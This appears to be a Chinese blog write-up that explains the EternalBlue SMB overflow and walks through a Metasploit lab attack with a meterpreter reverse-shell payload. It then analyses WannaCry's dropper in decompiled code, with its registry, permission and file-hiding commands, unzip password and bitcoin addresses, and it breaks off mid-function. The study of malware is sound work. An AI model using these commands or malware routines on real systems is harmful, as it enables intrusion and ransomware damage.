v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作： 1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小 2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大 3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出 2.4 漏洞的利用2.4.1 情况说明漏洞代码工作在内核的非分页内存中。也可以工作在大非分页池中。这些类型的池都没有在页的开始嵌入任何头部。因此需要特殊的技巧来利用这些漏洞。这些技巧需要逆向一些数据结构 2.4.2 利用过程EternalBlue首先发送一个SRVbuffer除了最后一个数据包。这是因为大非分页池将在会话中最后一个数据包被服务端接收的时候被建立。SMB服务器会把会话中接受到的数据读取并叠加起来放入输入缓冲区中。所有的数据会在TRANS包中被标明。当接收到所有的数据 SMB服务器将会处理这些数据。数据通过CIFS(Common Internet File System)会被分发到SrvOpen2函数中来读取。 EternalBlue发送的所有数据会被SMB服务器收到后，SMB服务器会发送SMB ECHO包。因为攻击可以在网速很慢的情况下实现，所以SMB ECHO是很重要的。 在我们的分析中，即使我们发送了初始数据，存在漏洞的缓冲区仍然没有被分配在内存中。 1.FreeHole_A: EternalBlue通过发送SMB v1数据包来完成占位 2.SMBv2_1n: 发送一组SMB v2数据包 3.FreeHole_B: 发送另一个占位数据包；必须确保第一个占位的FreeHole_A被释放之前，这块内存被分配 4.FreeHole_A_CLOSE: 关闭连接，使得第一个占位的内存空间被释放 5.SMBv2_2n: 发送一组SMB v2数据包 6.FreeHole_B_CLOSE: 关闭连接来释放缓冲区 7.FINAL_Vulnerable_Buffer: 发送最后的数据包，这个数据包将会被存储在有漏洞的缓冲区中 有漏洞的缓冲区（之前SRVNET创建的）被填入的数据将会覆盖和部分SRVNET的缓冲区。在FEAlist转换到NTFEAlist时会发生错误，因为FEA结构会在覆盖SRVNET缓冲区之后失效，所以服务器将以STATUS_INVALID_PARAMETER（0xC000000D）返回。 2.5 漏洞攻击2.5.1 准备工作准备两台虚拟机，一台kali-linux 一台 win7，使用Wireshark进行抓包，利用msfconsole工具进行模拟攻击 2.5.2 攻击过程1.获取两台主机的IP地址 2.测试两台主机的连通性 3.使得 kali 的数据保持开启 测试是否开启： service postgresql status 打开数据库 ： service postgresql start 初始化数据库： msfdb init 4.利用 msfconsole 进行漏洞扫描 启动： msfconsole 查看数据库连接情况：db_status 搜索漏洞： search ms17_010 扫描命令：use auxiliary/scanner/smb/smb_ms17_010 攻击命令（后面使用）：use exploit/windows/smb/ms17_010_eternalblue 设置扫描的主机或者主机段：set rhosts 192.168.223.141/24; 设置扫描线程为20： set threads 20； 最后输入run执行扫描。 同时，利用 wireshark抓包工具，监听ethO 进行攻击：use exploit/windows/smb/ms17_010_eternalblue 设置攻击目标（靶机）：set rhost 192.168.223.141 设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp 设置监听主机（kali）：set lhost 192.168.223.137 利用exploit进行攻击：exploit 成功攻击！！ 图1 打开并初始化数据库 图2 打开msfconsole 并查找ms17_010 4 病毒分析4.1 基础静态分析4.1.1 查壳第一步防止开发者对病毒进行了包装，对病毒进行查壳操作，以下是查壳结果 图一：Exeinfo查壳 通过 Lamer info字段的Not packed，我们知道病毒无壳，省去了脱壳的麻烦 4.1.2 字符串分析利用IDA工具中提供的 Strings Window工具，我们可以查找病毒源文件中含有的显式的字符串，这一步能帮我们对病毒的大致功能和加密方式等由大致的了解。 图二：病毒的字符串信息 通过字符串分析，我们大致了解了，病毒可能利用了RSA和AES的加密方式，同时和 TaskStart 函数，t.wnry,tasksche.exe等文件有很大的关联关系，还利用了CMD调用了某些参数。 4.1.3 识别加密算法通过 Kyrpto ANAlyzer 插件识别病毒文件的加密算法 图四： 识别加密算法 经过分析得知，病毒使用了 CRC32 和 AES 加密算法，CryptDecrypt 和CryptEncrypt 是微软提供的加密类库，ZIP2和ZLIB 是压缩算法 4.1.4 查看导入表通过PEiD提供的输入表查看器，对病毒源文件的输入表进行查看，探寻病毒。 图五：查看病毒输入表 在Kernel32中发现病毒利用了LoadResource，LockResource等函数，表明了病毒资源段中可能藏有病毒需要利用的其他文件 图六：病毒输入表-注册表操作 病毒利用了ADVAPI32.dll中的RegCreateKeyW，RegSetValueExA等函数，代表病毒源码中涉及了对注册表的操作，可以在病毒执行完后对注册表进行比较。 4.1.5 提取资源段通过输入表的分析，我们了解到病毒exe的资源段中可能隐藏着病毒所拥有的其他资源文件，为此，我们对资源文件进行提取。 图七：资源段查看 从资源段分析来看，XIA资源段最值得我们关注，在资源段中我们发现资源段头的PK字段，判断该资源段应该是rar的压缩文件，我们将资源段提取出来 图八：XIA资源段 发现了隐藏在病毒资源段的文件 其中msg中是一些语言包 4.2 基础动态分析4.2.1 进程分析使用 ProcessMonitor 查看进程树 图九：进程树 Wcry.exe总共拥有5个子进程，其中cmd负责执行一些批处理文件 4.2.2 注册表分析使用Regshot 比较病毒执行前后的注册表变化 图十：regshot结果 通过Regshot的比对，我们发现病毒增加了一些加解密需要的密钥注册表项和自动运行的病毒路径位置 4.2.3 文件监控下面我们利用火绒剑抓取病毒运行过程中病毒文件对于文件的更改， 图十一：文件监控 通过对文件的监控，我们发现文件在病毒文件夹里放置了 Pky，eky，res 文件，应该是病毒所需要的公钥，私钥等文件 Bat 文件，是病毒所需要执行的繁杂的重复性的工作 Vbs 文件，应该是病毒执行时的中间文件，用于执行感染操作 图十二：文件行为监控 继续进行文件行为的监控，监控到文件在自己的路径释放解压文件的操作，印证了我们之前对于资源段的分析。 4.2.4 感染效果在病毒感染后，分析病毒感染的结果： 图十三：感染病毒文件 可以看到，病毒在每个文件夹下新建了一个@Please_Read_Me@.txt和 @WanaDecryptor@.exe用于要求用户支付解锁账户，并将其他文件加密为以.WNCRY的文件 4.2.5 网络监控 图十四：网络连接情况 通过分析病毒释放的文件 taskhsvc.exe的联网情况，我们看到病毒一直在对49159和9050端口进行监听，并利用端口尝试对局域网内的一些IP进行渗透。 5 wncry.exe 病毒主程序分析5.1 主体逻辑12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) &#123; Filename = byte_40F910; memset(&amp;v12, 0, 0x204u); // 初始化内存 v13 = 0; v14 = 0; GetModuleFileNameA(0, &amp;Filename, 0x208u); // 获取当前进程的完整路径 GetRandom((int)RandResult); // 获取一串随机的字母+数字 if ( *(_DWORD *)_p___argc(Str) != 2 // 如果命令行参数个数不等于2 || (v5 = _p___argv(), strcmp(*(const char )(*(_DWORD *)v5 + 4), aI)) || !sub_401B5F(0) || (CopyFileA(&amp;Filename, FileName, 0), GetFileAttributesA(FileName) == -1) || !sub_401F5D() ) &#123; if ( strrchr(&amp;Filename, &#x27;&#x27;) ) // 查找在当前文件路径中的位置 *strrchr(&amp;Filename, &#x27;&#x27;) = 0; SetCurrentDirectoryA(&amp;Filename); // 切换当前的工作目录 SetReg(1); // 设置当前进程目录到注册表项 ReleaseFiles(0, ::Str); // 释放文件和语言包到工作路径下 WriteCwnry(); // 重写c.wnry文件 添加比特币账户 ExeCmdCommand(CommandLine, 0, 0); // 隐藏当前路径下的所有文件 ExeCmdCommand(aIcaclsGrantEve, 0, 0); // 添加Everyone用户 授予all访问权限 if ( GetApis() ) // 获取一些必要的API函数地址 &#123; CDatabase::CDatabase(this); // 构造函数 初始化临界区 if ( ImportKeyAndAllocMem(this, 0, 0, 0) )// 导入私钥并且分配两块固定内存 &#123; DecryptFileSize = 0; pFile = (void *)DecryptFile(this, t_wnry, (int)&amp;DecryptFileSize);// 从t.wnry中解密出一个dll文件 if ( pFile ) &#123; pHeapBase = WriteAllocMem(pFile, DecryptFileSize);// 申请一块堆空间 并把解密出的dll写入到堆空间 pHeapBase=dll-&gt;Nt头 if ( pHeapBase ) &#123; TaskStartAddr = (void (__stdcall *)(_DWORD, _DWORD))GetExportFunAddr((int)pHeapBase, TaskStart); if ( TaskStartAddr ) // 从堆空间中取出dll导出函数的地址 并调用 TaskStartAddr(0, 0); &#125; &#125; &#125; CDatabase::~CDatabase((CDatabase *)this); // 析构函数 释放资源 &#125; &#125; return 0; &#125; 通过对主题的完整注释我们大致了解了病毒所进行的主要操作，经总结为如下过程： 初始化 内存，工作目录和随机数 设置注册表项为当前进程目录 释放资源包内的文件和语言包 在c.wnry 内添加比特币账户 隐藏当前路径下的文件 进行加解密操作 释放资源 以上过程能完整的展现出了病毒进行的操作，但是有一些操作由于参数设置错误，实际上没有实现。接下来我将对病毒的具体行为进行分析总共分为两个部分第一部分 初始化操作 第二部分 加载病毒核心操作 5.2 初始化操作初始化作为病毒文件的第一部分主要涉及几个函数GetRandom获取随机数，SetReg设置注册表，ReleaseFiles释放资源文件，我们将进行逐一的分析 5.2.1 GetRandom 获取随机数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int __cdecl GetRandom(int RandResult) &#123; GetComputerNameW(&amp;ComputerName, &amp;nSize); // 获取计算机名 i = 0; v1 = 1; if ( wcslen(&amp;ComputerName) ) // 如果计算机名的长度不为0 &#123; v2 = &amp;ComputerName; do &#123; v1 *= *v2; // V1=[ComputerName] 即V1=计算机名的第一个字母的ASCII ++i; // 下标自增 ++v2; // ComputerName++两次 即截断计算机名的第一个字母 v3 = wcslen(&amp;ComputerName); &#125; while ( i &lt; v3 ); &#125; // 循环次数i=strlen(Computer) srand(v1); // v1=计算机名所有ASCII的乘积 v4 = 0; v5 = rand() % 8 + 8; if ( v5 &gt; 0 ) &#123; do *(_BYTE *)(v4++ + RandResult) = rand() % 0x1A + 0x61;// 随机取了一个字符串 假设：cecazrsga while ( v4 &lt; v5 ); &#125; v6 = v5 + 3; while ( v4 &lt; v6 ) *(_BYTE *)(v4++ + RandResult) = rand() % 0xA + 0x30;// 随机取了一个数字122 result = RandResult; *(_BYTE *)(v4 + RandResult) = 0; return result; &#125; // 最后的结果等于两次随机结果拼在一起 cecazrsga122 病毒首先获取计算机名ASCII码的连乘，并以其作为种子利用rand()函数得到一对字母+数字的随机数作为随机字符串 5.2.2 SetReg 设置注册表项1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768signed int __cdecl SetReg(int a1) &#123; wcscat(&amp;Dest, Source); // 字符串拼接-&gt;SoftwareWanaCrypt0r v12 = 0; while ( 1 ) &#123; if ( v12 ) RegCreateKeyW(HKEY_CURRENT_USER, &amp;Dest, &amp;hKey); else RegCreateKeyW(HKEY_LOCAL_MACHINE, &amp;Dest, &amp;hKey);// 创建了注册表项 if ( hKey ) &#123; if ( a1 ) &#123; GetCurrentDirectoryA(0x207u, &amp;Buffer); // 获取当前的进程所在目录 v1 = strlen(&amp;Buffer); // 获取所在目录的长度 v2 = RegSetValueExA(hKey, ValueName, 0, 1u, (const BYTE *)&amp;Buffer, v1 + 1) == 0;// 将当前exe所在的路径设置为注册表项的值 &#125; else &#123; cbData = 519; v3 = RegQueryValueExA(hKey, ValueName, 0, 0, (LPBYTE)&amp;Buffer, &amp;cbData); v2 = v3 == 0; if ( !v3 ) SetCurrentDirectoryA(&amp;Buffer); &#125; RegCloseKey(hKey); if ( v2 ) break; &#125; if ( ++v12 &gt;= 2 ) return 0; &#125; return 1; &#125; 可见病毒创建了一个注册表项并将当前病毒主体所在位置的决定路径设置到注册表的HKEY_LOCAL_MACHINESOFTWARE 下 5.2.3 ReleaseFiles 释放资源文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869int __cdecl ReleaseFiles(HMODULE hModule, char *Str) &#123; hRsrc = FindResourceA(hModule, (LPCSTR)0x80A, Type);HRSRC = hRsrc; if ( !hRsrc ) return 0; hGlobal = LoadResource(hModule, hRsrc); if ( !hGlobal ) // 将资源载入到内存并锁定 return 0; lpRes = LockResource(hGlobal); if ( !lpRes ) return 0; ResourceSize = SizeofResource(hModule, HRSRC);v7 = sub_4075AD(lpRes, ResourceSize, Str); // str=&quot;WNcry@2017&quot; 函数返回1||0 if ( !v7 ) return 0; v11 = 0; memset(&amp;Str1, 0, 0x128u); SetReleasePath(v7, -1, (int)&amp;v11); // 将0x24放到内存中 v11=0x24 v9 = v11; v10 = 0; if ( v11 &gt; 0 ) &#123; do &#123; SetReleasePath(v7, (int)v10, (int)&amp;v11); // 设置文件释放的路径 并保存到内存中 if ( strcmp(&amp;Str1, Str2) || GetFileAttributesA(&amp;Str1) == -1 )// 比较b.wnry和c.wnry ReleaseFile((int)v7, v10, &amp;Str1); // 释放文件到工作目录下 ++v10; &#125; while ( (signed int)v10 &lt; v9 ); &#125; FreeMemory(v7); // 做内存释放等扫尾工作 return 1; &#125; 该函数的主要作用就是将资源包中的文件，利用解压密码”WNcry@1017”进行解压到当前进程的路径下，方便下面的操作进一步利用压缩包中的文件。 5.2.4 WriteCwnry 重写c.wnry123456789101112131415161718192021int WriteCwnry() &#123; Source = a13am4vw2dhxygx; // 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94v5 = a12t9ydpgwuez9n; // 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw v6 = a115p7ummngoj1p; // 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn result = ReadOrWriteFileToMem(&amp;DstBuf, 1); // 读取c.wnry到内存中 if ( result ) &#123; v1 = rand(); strcpy(&amp;Dest, (&amp;Source)[v1 % 3]); // 拷贝随机账户到目标内存 result = ReadOrWriteFileToMem(&amp;DstBuf, 0); // 写入c.wnry到内存 &#125; return result; &#125; 函数随机的将三个比特币账户中的一个写入c.wnry文件中 5.2.5 ExeCmdCommand 命令行执行123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl ExeCmdCommand(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode) &#123; struct _STARTUPINFOA StartupInfo; //该结构用于指定新进程的主窗口特性 struct _PROCESS_INFORMATION ProcessInformation; // [esp+4Ch] [ebp-10h] StartupInfo.cb = 68; memset(&amp;StartupInfo.lpReserved, 0, 0x40u); ProcessInformation.hProcess = 0; ProcessInformation.hThread = 0; ProcessInformation.dwProcessId = 0; ProcessInformation.dwThreadId = 0; StartupInfo.wShowWindow = 0; StartupInfo.dwFlags = 1; if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x8000000u, 0, 0, &amp;StartupInfo, &amp;ProcessInformation) ) return 0; // 设置当前目录下的所有文件属性为隐藏 命令行参数错误 函数并未成功 if ( dwMilliseconds ) // 条件不成立 跳转到关闭句柄处 &#123; if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) ) TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF); if ( lpExitCode ) GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode); &#125; CloseHandle(ProcessInformation.hProcess); CloseHandle(ProcessInformation.hThread); return 1; &#125; 在函数主题逻辑中利用到了两次ExeCmdCommand函数： 第一个创建了一个进程 并利用参数”attrib+h”将当前目录下的所有文件设置为隐藏 第二个利用参数 “icacls ./grant Everyone:F /T /C /Q”添加用户并给予权限 5.3 加载病毒核心操作在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析 5.3.1 GetApis 获取必要的API函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071unsigned int GetApis() &#123; HMODULE KernelBase; // eax HMODULE KernelAddr; // edi FARPROC CloseHandle_Addr; // eax signed int result; // eax if ( !GetCryptoAPIAddr() ) // 获取CryptoAPI函数地址 goto LABEL_15; if ( CreateFileW_Addr ) goto LABEL_16; KernelBase = LoadLibraryA(Kernel32); // 加载Kernel32.dll的基址 KernelAddr = KernelBase; if ( !KernelBase ) goto LABEL_15; CreateFileW_Addr = (int)GetProcAddress(KernelBase, CreateFileW);// 获取文件操作的API函数地址 WriteFile_Addr = (int)GetProcAddress(KernelAddr, WriteFile_0); ReadFile_Addr = (BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress( KernelAddr, ReadFile_0); MoveFileW_Addr = (int)GetProcAddress(KernelAddr, MoveFileW); MoveFileExW_Addr = (int)GetProcAddress(KernelAddr, MoveFileExW); DeleteFileW_Addr = (int)GetProcAddress(KernelAddr, DeleteFileW); CloseHandle_Addr = GetProcAddress(KernelAddr, CloseHandle_0); Int_CloseHandle_Addr = (int)CloseHandle_Addr; if ( !CreateFileW_Addr ) goto LABEL_15; if ( WriteFile_Addr &amp;&amp; ReadFile_Addr &amp;&amp; MoveFileW_Addr &amp;&amp; MoveFileExW_Addr &amp;&amp; DeleteFileW_Addr &amp;&amp; CloseHandle_Addr ) LABEL_16: result = 1; else LABEL_15: result = 0; return result; &#125; 此函数的主要目的就是为后面的操作获取常用API函数的地址例如-CreateFileW。 5.3.2 CDatabase::CDataBase 构造函数1234567891011121314151617char *__thiscall CDatabase::CDatabase(_DWORD *this) &#123; char *v1; // esi v1 = (char *)this; Crt_InitializeCriticalSection((char *)this + 4);// 初始化临界区对象 Crt_InitializeCriticalSection(v1 + 44); return v1; &#125; 初始化两个用于线程同步的临界区对象CDatabase 5.3.3 ImportKeyAndAllocMem 导入密钥并申请空间123456789101112131415161718192021222324252627282930313233343536373839404142434445int __thiscall ImportKeyAndAllocMem(_DWORD *this, LPCSTR FileName, int a3, int a4) &#123; _DWORD *v4; // esi HGLOBAL hGlobal; // eax HGLOBAL hGlobal_2; // eax v4 = this; if ( !ImportPrivateKey(this + 1, FileName) ) // 导入私钥 return 0; if ( FileName ) ImportPrivateKey(v4 + 11, 0); hGlobal = GlobalAlloc(0, 0x100000u); // 申请一块全局的固定内存块 v4[306] = hGlobal; if ( !hGlobal ) return 0; hGlobal_2 = GlobalAlloc(0, 0x100000u); v4[307] = hGlobal_2; if ( !hGlobal_2 ) return 0; v4[309] = a3; v4[308] = a4; return 1; &#125; 这个函数完成了两项工作： 导入 RSA 私钥，用来解密后面的相关文件 申请了两块大小为 0x100000 的内存 5.3.4 DecryptFile 解密t.wnry123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int __thiscall DecryptFile(void this, LPCSTR lpFileName, int DecryptFileSize) &#123; hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);// 以只读的方式打开t.wnry if ( hFile != (HANDLE)INVALID_HANDLE_VALUE ) &#123; GetFileSizeEx(hFile, &amp;FileSize); // 获取文件大小 if ( FileSize.QuadPart &lt;= 0x6400000 ) &#123; if ( ReadFile_Addr(hFile, &amp;lpBuffer, 8u, &amp;lpNumberOfBytesRead, 0) )// 读取8个字节的文件内容 读取的内容为WANACRY! &#123; if ( !memcmp(&amp;lpBuffer, aWanacry, 8u) ) &#123; if ( ReadFile_Addr(hFile, &amp;Buffer, 4u, &amp;lpNumberOfBytesRead, 0) )// 继续向后读取4个字节的内容 读取的内容为0x100 &#123; if ( Buffer == 0x100 ) &#123; if ( ReadFile_Addr(hFile, pBuffer[306], 0x100u, &amp;lpNumberOfBytesRead, 0) )// 读取0x100个字节 &#123; if ( ReadFile_Addr(hFile, &amp;buff, 4u, &amp;lpNumberOfBytesRead, 0) )// 再次读取4个字节 内容为04 &#123; if ( ReadFile_Addr(hFile, &amp;buffer, 8u, &amp;lpNumberOfBytesRead, 0) )// 继续往后读8字节-&gt;10000 &#123; if ( buffer &lt;= 0x6400000 ) &#123; if ( DecryptData((int)(pBuffer + 1), (BYTE *)pBuffer[306], Buffer, &amp;DecryptDatas, (int)&amp;DataSize) )// 对读取的0x100个字节进行解密 &#123; sub_402A76((char *)pBuffer + 84, (int)&amp;DecryptDatas, Src, DataSize, 0x10u); hGlobal_3 = (int)GlobalAlloc(0, buffer); if ( hGlobal_3 ) &#123; if ( ReadFile_Addr(hFile, pBuffer[306], FileSize.LowPart, &amp;lpNumberOfBytesRead, 0)// 读取0x10000个字节 &amp;&amp; lpNumberOfBytesRead &amp;&amp; (buffer &lt; 0 || SHIDWORD(buffer) &lt;= 0 &amp;&amp; lpNumberOfBytesRead &gt;= (unsigned int)buffer) ) &#123; pFileAddr = hGlobal_3; DecryptPEFile((int)(pBuffer + 21), pBuffer[306], hGlobal_3, lpNumberOfBytesRead, 1);// 将读取的内容解密成一个PE文件 *(_DWORD *)DecryptFileSize = buffer; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; local_unwind2((int)&amp;ms_exc.registration, -1); return pFileAddr; // 返回解析出的文件首地址 &#125; 在函数执行过程中，我们一直对t.wnry文件执行读取操作，每读取一个片段到内存边利用已有的RSA私钥进行解密，返回解密后的文件内容。 图十五：OD查看函数返回值 查看解密后的文件，是一个PE文件，通过对文件源码和结构的分析，判断它是一个dll文件，且是先前资源包中的t_wnry.dll。 5.3.5 WriteAllocMem 拷贝PE文件到内存123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278int *__cdecl sub_4021E9(void *pFileBase, int FileSize, int VirtualAlloc_Addr, int VirtualFree_Addr, int LoadLibraryA_Addr, int GetProcAddress_Addr, int FreeLibrary_Addr, int a8) &#123; v28 = 0; if ( !CmpFileSize(FileSize, 0x40u) ) // 比较文件大小是否大于等于0x40 return 0; if ( *(_WORD *)pFileBase != 0x5A4D ) // 判断是否是PE文件 goto LABEL_3; if ( !CmpFileSize(FileSize, *((_DWORD *)pFileBase + 0xF) + 0xF8) )// 比较文件大小是否大于等于0x1F0 return 0; NtHeader = (char *)pFileBase + *((_DWORD *)pFileBase + 0xF); if ( *(_DWORD *)NtHeader != 0x4550 ) // 判断是否是PE文件 goto LABEL_3; if ( *((_WORD *)NtHeader + 2) != 0x14C ) // 判断文件运行平台 0x14C代表I386 goto LABEL_3; SectionAlignment = *((_DWORD *)NtHeader + 14); if ( SectionAlignment &amp; 1 ) // 判断内存对齐粒度 goto LABEL_3; NumberOfSection = *((unsigned __int16 *)NtHeader + 3); if ( *((_WORD *)NtHeader + 3) ) // 判断区段数量 &#123; TextName = &amp;NtHeader[*((unsigned __int16 *)NtHeader + 10) + 0x24];// 取出SectionHeader[0]-&gt;name-----.text do &#123; TextSize = *((_DWORD *)TextName + 1); // 取出SectionHeader[0]-&gt;SizeOfRawData-----0x6000 TextVirtualAddress = *(_DWORD *)TextName; // 取出SectionHeader[0]-&gt;VirtualAddersss-----0x1000 if ( TextSize ) SectionHeader[1] = TextSize + TextVirtualAddress;// 代码段的大小+代码段的起始地址=下一个区段的起始地址 else SectionHeader[1] = SectionAlignment + TextVirtualAddress; if ( SectionHeader[1] &gt; v28 ) v28 = SectionHeader[1]; TextName += 0x28; --NumberOfSection; &#125; while ( NumberOfSection ); // 遍历区段 &#125; hKernel32 = GetModuleHandleA(Kernel32); // 获取Kernel32的基址 if ( !hKernel32 ) return 0; GetSystemInfo_Addr = (void (__stdcall *)(char *))((int (__cdecl *)(HMODULE, void (__stdcall *)(LPSYSTEM_INFO), _DWORD))GetProcAddress_Addr)、(hKernel32, GetNativeSystemInfo, 0);// 获取GetNativeSystemInfo函数地址 if ( !GetSystemInfo_Addr ) return 0; GetSystemInfo_Addr(&amp;lpSystemInfo); // 获取系统信息 v17 = ~(v27 - 1); dwSize = v17 &amp; (*((_DWORD *)NtHeader + 20) + v27 - 1); if ( dwSize != (v17 &amp; (v27 + v28 - 1)) ) // 此处条件不成立 跳过if分支 &#123; LABEL_3: SetLastError(0xC1u); return 0; &#125; pAllocAddress = ((int (__cdecl *)(_DWORD, int, signed int, MACRO_PAGE, int))VirtualAlloc_Addr)( *((_DWORD *)NtHeader + 13), dwSize, 0x3000, PAGE_READWRITE, a8); // 申请一块大小为0x10000的可读可写的内存空间 if ( !pAllocAddress ) &#123; pAllocAddress = ((int (__cdecl *)(_DWORD, int, signed int, MACRO_PAGE, int))VirtualAlloc_Addr)( 0, dwSize, 0x3000, PAGE_READWRITE, a8); // 如果申请失败则再次申请 if ( !pAllocAddress ) &#123; LABEL_24: SetLastError(0xEu); return 0; &#125; &#125; hHeap = GetProcessHeap(); // 获取进程的堆句柄 pHeapAddress = (unsigned int)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x3Cu); pHeapBase = (int *)pHeapAddress; if ( !pHeapAddress ) &#123; ((void (__cdecl *)(int, _DWORD, signed int, int))VirtualFree_Addr)(pAllocAddress, 0, 0x8000, a8); goto LABEL_24; &#125; *(_DWORD *)(pHeapAddress + 4) = pAllocAddress; LOWORD(pHeapAddress) = *((_WORD *)NtHeader + 11); pHeapBase[5] = (pHeapAddress &gt;&gt; 13) &amp; 1; pHeapBase[7] = VirtualAlloc_Addr; pHeapBase[8] = VirtualFree_Addr; pHeapBase[9] = LoadLibraryA_Addr; pHeapBase[10] = GetProcAddress_Addr; pHeapBase[11] = FreeLibrary_Addr; pHeapBase[12] = a8; pHeapBase[14] = v27; if ( !CmpFileSize(FileSize, *((_DWORD *)NtHeader + 0x15))// 比较文件大小是否大于等于SizeOfHeaders 0x1000 || (AllocAddr = (char *)((int (__cdecl *)(int, _DWORD, signed int, signed int, int))VirtualAlloc_Addr)( pAllocAddress, *((_DWORD *)NtHeader + 21), 0x1000, 4, a8), // 申请一块大小为0x1000的可读可写的内存 0x1000是SizeOfHeaders memcpy(AllocAddr, pFileBase,*((_DWORD *)NtHeader + 21)),// 把PE头拷贝到申请的堆空间 NtHeaderBaseAddr = (int)&amp;AllocAddr[*((_DWORD *)pFileBase + 0xF)], *pHeapBase = NtHeaderBaseAddr, *(_DWORD *)(NtHeaderBaseAddr + 52) = pAllocAddress, !sub_402470((int)pFileBase, FileSize, (int)NtHeader, (int)pHeapBase)) || (*(_DWORD *)(*pHeapBase + 52) == *((_DWORD *)NtHeader + 13) ? (pHeapBase[6] = 1) : (pHeapBase[6] = sub_402758(pHeapBase, *(_DWORD *)(*pHeapBase + 52) - *((_DWORD *)NtHeader + 13))), !sub_4027DF(pHeapBase) || !sub_40254B(pHeapBase) || !sub_40271D(pHeapBase)) ) &#123; LABEL_37: sub_4029CC(pHeapBase); return 0; &#125; v24 = *(_DWORD *)(*pHeapBase + 40); if ( v24 ) &#123; if ( pHeapBase[5] ) &#123; if ( !((int (__stdcall *)(int, signed int, _DWORD))(pAllocAddress + v24))(pAllocAddress, 1, 0) ) &#123; SetLastError(0x45Au); goto LABEL_37; &#125; pHeapBase[4] = 1; &#125; else &#123; pHeapBase[13] = pAllocAddress + v24; &#125; &#125; else &#123; pHeapBase[13] = 0; &#125; return pHeapBase; &#125; 该函数申请了一块堆空间 并将去掉了解密出的PE文件的DOS头并拷贝到了堆空间中 5.3.6 GetExportFunAddr 获取导出函数地址123456789101112131415AllocBase = (_DWORD )(pHeapBase + 4); // AllocBase=0x10000000 是申请的空间的基址 DataDirectory = (int)((_DWORD )pHeapBase + 0x78);// pe头+0x78=数据目录表 AllocBase_2 = (_DWORD )(pHeapBase + 4); if ( !(_DWORD )((_DWORD )pHeapBase + 0x7C) ) goto LABEL_12; ExportRVA = DataDirectory; // 取出数据目录表的第一项-&gt;导出表的RVA NumberOfNames = (_DWORD )(DataDirectory + AllocBase + 0x18);// 取出以名称方式导出的函数数量 ExportVA = (_DWORD )(AllocBase + ExportRVA); // 基址+导出表的RVA=导出表的VA 该函数有两个参数 堆空间的首地址 和TaskStart这个字符串并返回了导出函数地址 对于函数逻辑：这个函数首先取出了数据目录表，并根据数据目录表找到了导出表，接着我们看一下dll文件的导出表： 图十六：t_wnry.dll 导出表 得知TaskStart就是传进去的第二个参数 5.4 小结 获取必要的API函数地址 导入私钥并申请空间 用导入的私钥解密出一个dll 申请一块堆空间 将dll写入到堆内存里 在堆内存中找到dll的导出函数地址 并调用 从上面的分析可以得出病毒的主体程序实际上只做了一些初始化的操作到目前为止并没有看到它感染或加密任何一个文件 也没有对用户进行勒索真正的核心代码在t.wnry中 由于这个函数是在堆空间中调用所以在IDA中并没有显示出伪C代码 那么接下来需要分析刚刚提取出来的dll 5.5 加载病毒核心操作在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析 5.3.1 GetApis 获取必要的API函数6 t.wnry.dll 病毒核心部分分析6.1 主体逻辑t.wnry.dll作为病毒的核心部分，包括了病毒所有的危害操作，包括加密解密文件，勒索用户等有害操作，下面我将为大家一步步的进行分析： 6.1.1 TaskStart 病毒的逻辑主体函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152int __stdcall TaskStart(HMODULE hModule, int a2) &#123;if ( a2 || RunSingle() ) // 互斥体防双开 return 0; Filename = word_1000D918; // 初始化缓冲区 memset(&amp;v12, 0, 0x204u); v13 = 0; GetModuleFileNameW(hModule, &amp;Filename, 0x103u);// 获取当前进程的完整路径 if ( 